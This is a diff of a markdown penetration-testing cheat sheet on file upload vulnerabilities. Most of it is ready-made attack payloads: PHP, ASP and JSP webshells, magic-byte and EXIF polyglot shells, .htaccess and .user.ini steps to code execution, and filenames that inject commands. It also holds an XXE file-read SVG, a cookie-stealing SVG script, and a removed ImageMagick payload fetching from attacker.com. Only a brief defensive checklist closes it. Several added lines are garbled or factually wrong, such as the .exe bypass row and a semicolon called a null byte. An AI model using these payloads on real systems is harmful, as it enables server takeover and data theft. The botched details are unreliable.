@@ -1,115 +1,73 @@
-# File Upload Vulnerabilities: Complete Reference
+# File Upload Vulnerabilities: 2026 Complete Reference
 
 ## Bypass Techniques
 
 ### Extension Bypass
-```bash
-# Case variation
-file.php, file.pHp, file.Php, file.PHP
-file.PhP5, file.sHtMl, file.AsAx
+| Blocked | Bypass |
+|---------|--------|
+| .php | .php3, .php4, .php5, .phtml, .pht, .phar |
+| .jsp | .JSP, .jspx, .jsw, .jsv |
+| .exe | .exe, .exe (double extension) |
+| All scripts | Test .user.ini, .htaccess first |
+| .pl | .cgi |
 
-# Double extension
-file.php.jpg, file.jpg.php, file.php%00.jpg
-file.php.;.jpg, file.php.jpg, file.php\x00.jpg
+### Double Extension
+- `shell.php.jpg` — some parsers see .jpg and allow
+- `shell.jpg.php` — Apache `AddType` might read .php
+- `file.php;.jpg` — null byte injection (old but test)
+- `file.php%00.jpg` — null byte URL encoded
 
-# Trailing dots/spaces
-file.php., file.php , file.php%20
-file.php%0d%0a.jpg, file.php%0a.jpg
-
-# Null byte injection
-file.php%00.jpg
-file.asp%00.gif
-file.aspx%00.png
-
-# Reverse extension
-file.jpg.php, file.png.php
-
-# Executable extensions
-.php, .php3, .php4, .php5, .phtml, .pht
-.asp, .aspx, .asa, .cer, .cdx
-.jsp, .jspx, .jsw, .jsv, .jspf
-.cgi, .pl, .py, .rb
-.shtml, .shtm
-```
-
-### Content-Type Manipulation
-```bash
-# Change MIME type
+### Content-Type Spoofing
+```http
 Content-Type: image/jpeg
-Content-Type: image/png
-Content-Type: image/gif
-Content-Type: application/pdf
-Content-Type: application/octet-stream
-
-# Multipart boundary manipulation
-Content-Type: multipart/form-data; boundary=---WebKitFormBoundary
-
-# Omit Content-Type entirely (some servers default to text/plain -> no validation)
+--actual content is PHP shell--
 ```
+Server only checks Content-Type header, not actual file content.
 
 ### Magic Byte Injection
-```python
-# Add magic bytes to bypass content validation
-# PNG header
-png_code = b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"
-
-# GIF89a header
-gif_header = b"GIF89a<?php system($_GET['cmd']); ?>"
-
-# JPEG header
-jpeg_header = b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>"
+```php
+// GIF89a prefix makes file look like GIF
+GIF89a<?php system($_GET['cmd']); ?>
 ```
 
-### SVG Upload (XXE + XSS)
+### ImageTrick (Polyglot)
+```bash
+# PHP shell in EXIF comment
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+```
+
+## Detection
+
+### Metacharacter Injection
+Test filenames for path traversal and command injection:
+- `../../../etc/passwd`
+- `file$(whoami).txt`
+- `` file`whoami`.txt ``
+- `file||whoami`
+
+### Upload to RCE
+1. Upload .htaccess with `AddType application/x-httpd-php .txt`
+2. Upload .user.ini with `auto_prepend_file=shell.txt`
+3. Upload webshell → find exact path (timestamp in response, /u/p/l/o/a/d/)
+4. Race condition: upload before delete script runs
+
+### SVG/XSS
+SVG files allowed for images:
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <text y="20">&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert(document.cookie)</script>
 </svg>
 ```
 
-## Server-Side Attacks
+## Tooling
+- **Burp Upload Scanner**: Automated file upload testing
+- **fuxploider**: Blind file upload fuzzing
+- **exiftool**: Manipulate EXIF/metadata for polyglot creation
 
-### Path Traversal
-```bash
-# Overwrite files via upload path
-../../../var/www/html/shell.php
-../../../etc/cron.d/malicious
-../../../../var/www/html/index.php
-../../../tmp/shell.php
-```
-
-### RCE via Uploaded File
-```bash
-# PHP: Webshell
-<?php system($_GET['cmd']); ?>
-<?php eval($_POST['code']); ?>
-<?= exec('whoami'); ?>
-
-# ASP: Command execution
-<% response.write CreateObject("WScript.Shell").Exec("cmd /c " &
-   request.querystring("cmd")).StdOut.ReadAll() %>
-
-# JSP: File read
-<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
-```
-
-### ImageTragick / ImageMagick
-```xml
-<!-- MSL file (ImageMagick Script Language) -->
-<?xml version="1.0" encoding="UTF-8"?>
-<image>
-  <read filename="https://attacker.com/evil.png" />
-  <write filename="/var/www/html/shell.php" />
-</image>
-```
-
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| Upload shell -> RCE on server | 9.8 | Network, Low, No auth, Full impact |
-| Upload SVG -> XXE -> file read | 7.5 | Network, Low, No auth, Confidentiality high |
-| Upload -> path traversal overwrite index | 8.1 | Network, Low, No auth, Integrity high |
-| Upload large file -> disk DoS | 5.3 | Network, Low, No auth, Availability only |
-| Upload -> stored XSS in download | 6.1 | Network, Low, User interaction required |
+## Defensive Checklist
+1. Whitelist extensions (never blacklist)
+2. Validate magic bytes + Content-Type (not MIME alone)
+3. Store files outside webroot
+4. Serve uploaded files via proxy script (not directly)
+5. Rename files on upload — strip original name
+6. Disable execution in upload directory
